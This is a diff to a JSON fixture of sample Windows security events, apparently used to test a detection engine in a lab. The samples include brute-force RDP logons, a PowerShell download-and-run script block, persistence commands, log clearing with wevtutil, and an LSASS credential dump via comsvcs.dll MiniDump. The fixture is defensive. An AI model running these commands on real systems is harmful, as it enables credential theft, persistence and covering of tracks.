@@ -1,8 +1,8 @@
 {
   "events": [
     {
-      "id": "test_evt_001_rdp_brute_force_tp",
-      "description": "True Positive: RDP Failed Logon Event",
+      "id": "test_evt_001_rdp_brute_force_tp_1",
+      "description": "True Positive: RDP Failed Logon Event (Attempt 1)",
       "channel": "Security",
       "event_id": 4625,
       "event_data": {
@@ -17,6 +17,86 @@
       "expected_detections": ["rdp_brute_force"]
     },
     {
+      "id": "test_evt_001_rdp_brute_force_tp_2",
+      "description": "True Positive: RDP Failed Logon Event (Attempt 2)",
+      "channel": "Security",
+      "event_id": 4625,
+      "event_data": {
+        "TargetUserName": "Guest",
+        "TargetDomainName": "CORP-LAB",
+        "Status": "0xc000006d",
+        "SubStatus": "0xc000006a",
+        "LogonType": "10",
+        "IpAddress": "192.168.56.20",
+        "IpPort": "54232"
+      },
+      "expected_detections": ["rdp_brute_force"]
+    },
+    {
+      "id": "test_evt_001_rdp_brute_force_tp_3",
+      "description": "True Positive: RDP Failed Logon Event (Attempt 3)",
+      "channel": "Security",
+      "event_id": 4625,
+      "event_data": {
+        "TargetUserName": "jsmith",
+        "TargetDomainName": "CORP-LAB",
+        "Status": "0xc000006d",
+        "SubStatus": "0xc000006a",
+        "LogonType": "10",
+        "IpAddress": "192.168.56.20",
+        "IpPort": "54233"
+      },
+      "expected_detections": ["rdp_brute_force"]
+    },
+    {
+      "id": "test_evt_001_rdp_brute_force_tp_4",
+      "description": "True Positive: RDP Failed Logon Event (Attempt 4)",
+      "channel": "Security",
+      "event_id": 4625,
+      "event_data": {
+        "TargetUserName": "admin",
+        "TargetDomainName": "CORP-LAB",
+        "Status": "0xc000006d",
+        "SubStatus": "0xc000006a",
+        "LogonType": "10",
+        "IpAddress": "192.168.56.20",
+        "IpPort": "54234"
+      },
+      "expected_detections": ["rdp_brute_force"]
+    },
+    {
+      "id": "test_evt_001_rdp_brute_force_tp_5",
+      "description": "True Positive: RDP Failed Logon Event (Attempt 5)",
+      "channel": "Security",
+      "event_id": 4625,
+      "event_data": {
+        "TargetUserName": "service_account",
+        "TargetDomainName": "CORP-LAB",
+        "Status": "0xc000006d",
+        "SubStatus": "0xc000006a",
+        "LogonType": "10",
+        "IpAddress": "192.168.56.20",
+        "IpPort": "54235"
+      },
+      "expected_detections": ["rdp_brute_force"]
+    },
+    {
+      "id": "test_evt_001_rdp_brute_force_fp_under_threshold",
+      "description": "False Positive: Only 1 failed attempt from this IP (Should not trigger brute force)",
+      "channel": "Security",
+      "event_id": 4625,
+      "event_data": {
+        "TargetUserName": "Administrator",
+        "TargetDomainName": "CORP-LAB",
+        "Status": "0xc000006d",
+        "SubStatus": "0xc000006a",
+        "LogonType": "10",
+        "IpAddress": "192.168.56.99",
+        "IpPort": "51234"
+      },
+      "expected_detections": []
+    },
+    {
       "id": "test_evt_002_powershell_encoded_tp",
       "description": "True Positive: Base64 Encoded PowerShell Process Creation",
       "channel": "Microsoft-Windows-Sysmon/Operational",
@@ -27,7 +107,17 @@
         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
         "User": "CORP-LAB\\Administrator"
       },
-      "expected_detections": ["suspicious_powershell"]
+      "expected_detections": ["suspicious_powershell_process"]
+    },
+    {
+      "id": "test_evt_002_powershell_scriptblock_tp",
+      "description": "True Positive: PowerShell ScriptBlock Log containing downloadstring",
+      "channel": "Microsoft-Windows-PowerShell/Operational",
+      "event_id": 4104,
+      "event_data": {
+        "ScriptBlockText": "$wc = New-Object System.Net.WebClient; $wc.DownloadString('http://example.com/payload.ps1')"
+      },
+      "expected_detections": ["suspicious_powershell_scriptblock"]
     },
     {
       "id": "test_evt_003_lsass_process_access_tp",
@@ -54,6 +144,57 @@
         "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9fb64"
       },
       "expected_detections": []
+    },
+    {
+      "id": "test_evt_005_persistence_registry_tp",
+      "description": "True Positive: Registry Run Key creation for persistence",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": 13,
+      "event_data": {
+        "Image": "C:\\Windows\\reg.exe",
+        "TargetObject": "HKU\\S-1-5-21-1234567890-1234567890-1234567890-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\CyberRangeTestPersistence",
+        "Details": "C:\\Windows\\System32\\cmd.exe /c echo cyber_range_persistence"
+      },
+      "expected_detections": ["persistence_registry_run_keys"]
+    },
+    {
+      "id": "test_evt_006_persistence_task_tp",
+      "description": "True Positive: Scheduled Task creation using schtasks.exe",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": 1,
+      "event_data": {
+        "Image": "C:\\Windows\\System32\\schtasks.exe",
+        "CommandLine": "schtasks /create /tn \"CyberRangeUpdateTask\" /tr \"notepad.exe\" /sc ONLOGON /f",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "User": "CORP-LAB\\Administrator"
+      },
+      "expected_detections": ["persistence_scheduled_tasks"]
+    },
+    {
+      "id": "test_evt_007_log_clearing_tp",
+      "description": "True Positive: Log cleared using wevtutil.exe",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": 1,
+      "event_data": {
+        "Image": "C:\\Windows\\System32\\wevtutil.exe",
+        "CommandLine": "wevtutil cl Application",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "User": "CORP-LAB\\Administrator"
+      },
+      "expected_detections": ["log_clearing_wevtutil"]
+    },
+    {
+      "id": "test_evt_008_lsass_dump_comsvcs_tp",
+      "description": "True Positive: LSASS dumping using comsvcs.dll via rundll32.exe",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": 1,
+      "event_data": {
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "CommandLine": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 784 C:\\windows\\temp\\lsass.dmp full",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "User": "CORP-LAB\\Administrator"
+      },
+      "expected_detections": ["lsass_dump_rundll32"]
     }
   ]
 }
